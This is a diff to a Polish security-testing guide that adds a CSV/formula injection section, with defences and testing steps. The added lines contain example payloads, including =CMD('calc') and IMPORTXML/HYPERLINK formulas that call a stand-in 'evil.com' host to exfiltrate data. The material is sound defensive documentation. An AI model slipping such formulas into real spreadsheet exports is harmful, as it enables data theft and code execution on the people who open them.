@@ -50,13 +50,36 @@ cat export.csv | grep -E "^[=+\-@]"
 
 ## CHEATSHEET OWASP — Kluczowe wskazówki
 
-> Źródło: OWASP CheatSheetSeries — WebSocket_Security_Cheat_Sheet.md
+> Źródło: OWASP CheatSheetSeries — Input_Validation_Cheat_Sheet.md
 
-- Waliduj naglowek Origin przy handshake — zapobiegaj cross-site WebSocket hijacking
-- Uzywaj WSS (WebSocket Secure) zamiast WS — szyfruj ruch
-- Uwierzytelniaj polaczenia WebSocket — nie zakladaj ze handshake = autoryzacja
-- Waliduj WSZYSTKIE wiadomosci po stronie serwera — WebSocket to dwukierunkowy kanal
-- Implementuj rate limiting na wiadomosci WebSocket
+### CSV/Formula Injection — czym jest
+
+- Atakujacy wstrzykuje formule Excel/Sheets w dane ktore beda eksportowane do CSV/XLSX
+- Payloady: `=CMD("calc")`, `=HYPERLINK("evil.com",1)`, `=IMPORTXML("evil.com/steal","/a")`
+- Ofiara otwiera plik w Excel/Sheets → formuly sa wykonywane → exfiltracja danych lub RCE
+
+### Niebezpieczne znaki poczatkowe
+
+- `=` — poczatek formuly Excel
+- `+` — poczatek formuly
+- `-` — poczatek formuly
+- `@` — poczatek formuly (Excel)
+- `\t` (tab) — moze byc traktowany jako separator + formula
+- `\r`, `\n` — nowa linia moze byc poczatkiem formuly w nastepnej komorce
+
+### Obrona
+
+- **Prefix**: dodaj `'` (apostrof) lub spacje przed wartosciami zaczynajacymi sie od `=`, `+`, `-`, `@`
+- **Escapowanie**: zamien `=` na `\=`, `+` na `\+` itd. w danych eksportowanych
+- **Walidacja input**: odrzuc dane zaczynajace sie od niebezpiecznych znakow jesli nie sa oczekiwane
+- **Content-Type**: ustaw `text/csv` (nie `application/vnd.ms-excel`) — ogranicza automatyczne otwieranie
+- **Ostrzezenie uzytkownika**: informuj o ryzyku przy pobieraniu plikow CSV z danymi uzytkownikow
+
+### Testowanie
+
+- Wstaw payloady w pola: komentarze, nazwy, opisy, adresy — cokolwiek co moze byc eksportowane
+- Pobierz CSV/XLSX i otworz w Excel — sprawdz czy formuly sa wykonywane
+- Testuj: `=1+1`, `=CMD("calc")`, `=HYPERLINK("https://evil.com","click")`, `@SUM(1+1)`
 
 ## ROZSZERZENIA BURP SUITE
 
